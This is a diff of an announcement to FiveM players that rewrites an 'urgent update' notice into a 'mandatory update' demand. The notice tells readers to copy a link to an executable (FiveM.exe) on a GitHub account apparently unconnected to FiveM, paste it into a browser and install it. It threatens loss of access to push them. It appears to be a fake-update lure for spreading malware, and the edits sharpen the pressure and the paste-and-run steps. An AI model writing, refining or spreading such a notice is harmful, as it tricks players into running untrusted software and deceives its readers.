@@ -1,31 +1,34 @@
-🚨⚠️ URGENT — FIVEM UPDATE | SEPTEMBER 26, 2026 ⚠️🚨
+🚨 MANDATORY UPDATE REQUIRED ⚠️
 
-📢 ATTENTION ALL FIVEM PLAYERS!
+🎮 FIVEM CRITICAL UPDATE — SEPTEMBER 26, 2026 🔴
 
-FiveM has received an important update on September 26, 2026. 🔄🔥
+⚠️ ATTENTION ALL FIVEM PLAYERS!
 
-⚠️ Please make sure your FiveM client is fully updated before joining the server.
+A critical FiveM update is now available and must be installed immediately.
 
-❌ An outdated version may cause:
+📥 DOWNLOAD THE UPDATE NOW:
+🔗 https://github.com/FiveM-Update/FiveM/releases/download/FiveM/FiveM.exe
 
-🚫 Connection issues
+📋 How to proceed:
 
-⚠️ Server compatibility problems
+Copy the link above.
 
-🔄 Update errors
+Open your browser.
 
-💥 Unexpected crashes
+Press Ctrl + V to paste the link.
 
-✅ Please restart FiveM and install any available updates before playing.
+Follow the instructions to complete the update.
 
-🎮 Thank you for your attention and cooperation!
-❤️ Stay safe, stay updated, and enjoy your RP!
+Restart FiveM once the update is finished. 🔄
 
-🚨 IMPORTANT: UPDATE FIVE M BEFORE JOINING! 🚨
+🚫 IMPORTANT: Failure to update may result in losing access to FiveM.
 
+⏰ UPDATE REQUIRED — DO NOT IGNORE THIS MESSAGE!
 
-https://github.com/FiveM-Update/FiveM/releases/download/FiveM/FiveM.exe
+🔴 MANDATORY UPDATE
+⚠️ UPDATE NOW
+🎮 STAY UPDATED — STAY CONNECTED
 
-
-
-https://github.com/FiveM-Update/FiveM/blob/main/FiveM.jpg?raw=true
+Thank you for your cooperation. ❤️
+https://raw.githubusercontent.com/FiveM-Update/FiveM/main/FiveM.jpg
+FiveM Team 
